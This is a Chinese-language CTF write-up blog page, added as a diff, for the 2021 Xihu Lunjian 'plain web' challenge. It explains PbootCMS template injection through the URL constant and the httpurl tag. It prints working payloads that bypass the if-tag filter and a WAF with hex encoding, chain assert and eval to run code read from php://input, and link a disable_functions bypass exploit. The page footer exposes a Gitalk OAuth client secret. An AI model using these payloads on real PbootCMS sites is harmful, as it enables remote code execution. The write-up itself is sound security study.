@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta content="yes" name="apple-mobile-web-app-capable" />
+  <meta content="black" name="apple-mobile-web-app-status-bar-style" />
+  <meta name="referrer" content="never">
+  <meta name="keywords" content="">
+  <meta name="description" content="">
+  <meta name="author" content="kveln">
+  <title>2021西湖论剑 朴实无华的web Writeup |  </title>
+  <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
+  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  <link rel="alternate" type="application/rss+xml" title="2021西湖论剑 朴实无华的web Writeup |   » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+    <meta property="og:description" content="2021西湖论剑 朴实无华的web Writeup"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/WscncUrcS/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content=" "/>
+  </head>
+  <body>
+  	<!-- Navigation -->
+  <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+        Menu
+        <i class="fas fa-bars"></i>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarResponsive">
+        <ul class="navbar-nav ml-auto">
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/">首页</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/archives">归档</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/post/about">关于</a>
+              
+          </li>
+          
+          <li class="nav-item">
+              
+              <a class="nav-link" href="/tags">分类</a>
+              
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- Page Header -->
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
+    <div class="overlay"></div>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <div class="post-heading">
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>2021西湖论剑 朴实无华的web Writeup</h1>
+            <span class="meta">
+            	Posted on
+              2021-12-31，5 min read
+            </span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Post Content -->
+  <article>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <h1 id="前言">前言</h1>
+<p>看本文之前需要了解pbootcms之前模板注入漏洞的原理</p>
+<h1 id="writeup">Writeup</h1>
+<p>开局是个pbootcms。Web🐕的老朋友了</p>
+<p>随便点几下。就会发现。只存在一个主页。其他功能点都无了。这时候。官网下个最新版审计。</p>
+<p>在挖掘这cms的时候。从历史漏洞入手。会发现这pboot全是模板注入的洞。根本原因就是可控输入到了解析if标签的点。刚好带入eval造成代码注入</p>
+<figure data-type="image" tabindex="1"><img src="https://c.img.dasctf.com/images/20211231/1640954097284-c20c9067-a1df-43c4-b6d0-bc5c41a38fae.png" alt="image-20211231203456773" loading="lazy"></figure>
+<p>历史版本的修复一直都是把可控点加个过滤。这整个cms。都是基于模板解析来的。也就是你所可控的都会走一遍模板解析。之后找个可控的输入点就行</p>
+<p>之前的pboot模板注入Exp如下</p>
+<pre><code>{pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}
+</code></pre>
+<p>这个<code>{user:password}</code>是因为在某次安全更新中会在解析pboot的if标签前。</p>
+<p>就把<code>pboot:if</code>替换成了<code>pboot@if</code>。而在此之后会有个把<code>{user:password}</code>替换为空的解析流程</p>
+<p>大致流程如下</p>
+<pre><code>1、可控模板内容
+2、解析各种标签
+3、替换pboot:if为pboot@if
+4、解析各种标签
+5、解析if标签
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://c.img.dasctf.com/images/20211231/1640954134732-97d968b6-845d-443c-bddc-4ef65bce19c0.png" alt="image-20211231203535370" loading="lazy"></figure>
+<p>那么问题来了。既然能通过模板解析的先后顺序来绕过pboot的if替换。是否有一个方法能把模板内的一些特殊标签解析成我们可控的输入呢。</p>
+<p>这当然有。不然哪来的题。。翻文档。</p>
+<p><code>https://www.pbootcms.com/docs/</code></p>
+<p>在公共标签中有个<code>httpurl</code>的标签</p>
+<figure data-type="image" tabindex="3"><img src="https://c.img.dasctf.com/images/20211231/1640955121724-cc7ac470-b7f8-4662-8add-edd7b6a6c868.png" alt="image-20211231205159865" loading="lazy"></figure>
+<p>跟进看一下</p>
+<figure data-type="image" tabindex="4"><img src="https://c.img.dasctf.com/images/20211231/1640955910776-cabea80a-54ea-46a2-9144-f6cd7fa9ebc3.png" alt="image-20211231210506622" loading="lazy"></figure>
+<p>这里有两个模板标签。一个是<code>{pboot:httpurl}</code>另一个是<code>{URL}</code>。</p>
+<figure data-type="image" tabindex="5"><img src="https://c.img.dasctf.com/images/20211231/1640955984049-844a3b61-a1fe-4850-81ec-1dbf84c4166b.png" alt="image-20211231210624787" loading="lazy"></figure>
+<p>这里的httpurl其实就是获取域名。而URL呢。在之前编译模板的时候就已经解析了。</p>
+<figure data-type="image" tabindex="6"><img src="https://c.img.dasctf.com/images/20211231/1640956084679-77dac2dc-332a-4866-9694-68d996b75a71.png" alt="image-20211231210801649" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://c.img.dasctf.com/images/20211231/1640956091238-9bdbaa3f-8572-4071-9f9f-c5876efaf999.png" alt="image-20211231210812097" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://c.img.dasctf.com/images/20211231/1640956114919-faf0d373-5598-4a93-b04a-0ff22ac301be.png" alt="image-20211231210835664" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://c.img.dasctf.com/images/20211231/1640956140521-bbf24cfb-650a-45ea-8184-a4e8fdd194f1.png" alt="image-20211231210901254" loading="lazy"></figure>
+<p>整个pboot就是先解析点基础的属性。然后再解析模板标签</p>
+<p>这个URL。在经过<code>self::parOutputDefine();</code>时会被解析成<code>&lt;?php echo URL;?&gt;</code></p>
+<p>这个URL。很明显是个常量。但是全局搜。没发现定义。</p>
+<p>pboot唯一一个加密文件。在<code>core/basic/Kernal.php</code>。里面是授权码鉴权啥的。懂得都懂</p>
+<p>echo出来就行。</p>
+<figure data-type="image" tabindex="10"><img src="https://c.img.dasctf.com/images/20211231/1640957365248-0d4c6221-5872-4a7b-ae21-fb10d7a9a0ae.png" alt="image-20211231212924590" loading="lazy"></figure>
+<p>这里。他把<code>$REQUEST_URI</code>定义为了URL。也就是我们所有GET的东西</p>
+<p>这不就是可控的输入点？</p>
+<p>OK。整理下思路</p>
+<pre><code>分析kernel.php。URL常量为我们访问的URI。带参数
+编译模板。把标签中的{URL}替换为URI
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://c.img.dasctf.com/images/20211231/1640957481144-3dcbbe70-01fd-44bf-9b96-8f8f748b4d1a.png" alt="image-20211231213120860" loading="lazy"></figure>
+<p>类似这样。然后就是解析httpurl。效果是这样。由于浏览器会编码。用BP发或者socket发就行。就不会把符号编码</p>
+<figure data-type="image" tabindex="12"><img src="https://c.img.dasctf.com/images/20211231/1640957501719-afd83cea-82ee-4d2a-953f-6a69402ad377.png" alt="image-20211231213142584" loading="lazy"></figure>
+<p>接下来就简单了。</p>
+<pre><code>a=}{pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}
+}主要是为了闭合最后的}
+{pboot:qrcode string{pboot:httpurl}/?a=xxx}
+{pboot:qrcode string{pboot:httpurl}}{pboot{user:password}:if(([php.info][0])([1][0]));//)}xxx{/pboot:if}}
+							闭合模板标签。把恶意的标签单独出去
+</code></pre>
+<p>然后就是绕waf了。害。这里加了点难度。有个长度限制。以及不能POST。</p>
+<p>饶了这么多次了。随便绕。他检测(关键字)那就引号16进制呗。直接放poc了。</p>
+<pre><code>/?a=}{pboot{user:password}:if((&quot;prin\x74_r&quot;)(&quot;\x41&quot;));//)}xxx{/pboot{user:password}:if}
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://c.img.dasctf.com/images/20211231/1640958067540-b128eae7-3d14-4942-abbf-d15673689c1d.png" alt="image-20211231214107859" loading="lazy"></figure>
+<p>这题是有disable_function和open_basedir的</p>
+<p>赛后有些师傅说。没phpinfo。。。然后就卡死了？？？</p>
+<p>那就绕啊。都是公开的老姿势了。</p>
+<pre><code>get_cfg_var 
+ini_get
+</code></pre>
+<p>接着绕下长度限制。可以试用create_function注入eval。反正关键字hex一下就行。</p>
+<p>当然还有其他方法用assert和eval的套娃了。大致<br>
+poc如下</p>
+<pre><code>&quot;if(assert(eval('&quot;.file_get_contents(&quot;php://input&quot;).&quot;'))&quot;
+</code></pre>
+<p>由于是字符串注入到eval。所以要注意闭合。这里就看对assert和eval的认知了。</p>
+<p>assert能动态调用。但是。eval不行</p>
+<figure data-type="image" tabindex="14"><img src="https://c.img.dasctf.com/images/20211231/1640958643866-98baf466-d5b5-449c-8f5c-08c9c073a36f.png" alt="image-20211231215042653" loading="lazy"></figure>
+<p>可以看到。虽然会Deprecated。但是不影响。之后就是用双引号绕过assert的限制</p>
+<p>然后构造<code>assert('eval('.file_get_contents('php://input').')')</code></p>
+<p>通过assert来调用eval。此时eval是以字符串传入的。16进制绕下就行。而且assert以代码执行。可以调用eval结构。</p>
+<p>exp如下</p>
+<pre><code>/?a=}{pboot{user:password}:if((&quot;asse\x72t&quot;)(&quot;eva&quot;.&quot;l('&quot;.(&quot;file_get_content\x73&quot;)(&quot;php://input&quot;).&quot;')&quot;));//)}xxx{/pboot{user:password}:if}
+</code></pre>
+<p>最后就是绕过disable_function了。就上个exp完事。</p>
+<p><code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p>
+<figure data-type="image" tabindex="15"><img src="https://c.img.dasctf.com/images/20211231/1640958902625-69515d9a-ac1c-4282-9018-daed8d5d6817.png" alt="image-20211231215502146" loading="lazy"></figure>
+
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/D5baJK4QD/">
+              <span class="post-title">
+                SCTF web&rarr;
+              </span>
+            </a>
+          </p>
+        
+        <div class="comment">
+          
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script>
+  var gitalk = new Gitalk({
+    clientID: 'c07e068ab9501a423854',
+    clientSecret: '33e8ada317c799c9a4ca5cbbb2070ff5a423903b',
+    repo: 'Message',
+    owner: 'guokeya',
+    admin: ['guokeya'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+  gitalk.render('gitalk-container')
+</script>
+
+          
+          
+        
+        </div>
+      </div>
+    </div>
+  </article>
+ <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <ul class="list-inline text-center">
+            
+            
+            <li class="list-inline-item">
+              <a href="http://github.com/guokeya" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+            </li>
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+              
+              <li class="list-inline-item">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                </span>
+              </a>
+              </li>
+          </ul>
+          <p class="copyright text-muted">Copyright &copy;<span> </span><br><a href="https://github.com/getgridea/gridea" class="Themeinfo">Powered by Gridea<br >浙ICP备2021000950号-1</a></p>
+        </div>
+      </div>
+    </div>
+   </footer>
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- Bootstrap core JavaScript -->
+  <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
+  <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+  <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
+<a id="back_to_top" href="#" class="back_to_top">
+  <span>▲</span></a>
+<script>$(document).ready((function(_this) {
+    return function() {
+      var bt;
+      bt = $('#back_to_top');
+      if ($(document).width() > 480) {
+        $(window).scroll(function() {
+          var st;
+          st = $(window).scrollTop();
+          if (st > 30) {
+            return bt.css('display', 'block')
+          } else {
+            return bt.css('display', 'none')
+          }
+        });
+        return bt.click(function() {
+          $('body,html').animate({
+            scrollTop: 0
+          },
+          800);
+          return false
+        })
+      }
+    }
+  })(this));</script>
+  </body>
+</html>
+
